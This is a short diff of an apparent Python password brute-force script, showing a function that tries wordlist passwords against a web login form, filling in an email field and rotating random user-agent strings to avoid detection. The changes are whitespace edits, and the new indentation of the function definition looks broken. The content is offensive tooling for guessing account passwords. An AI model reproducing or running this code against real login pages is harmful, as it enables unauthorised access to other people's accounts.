@@ -27,10 +27,10 @@ def main():
 	search()	
 	print("Password does not exist in the wordlist") 	
 
- def brute(password):	
+ 	def brute(password):
 	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))	
 	sys.stdout.flush()	
-	br.addheaders = [('User-agent', random.choice(useragents))]	
+	br.addheaders = [('User-agent',random.choice(useragents))]	
 	site = br.open(login)	
 	br.select_form(nr = 0)	
 	br.form['email'] = email	
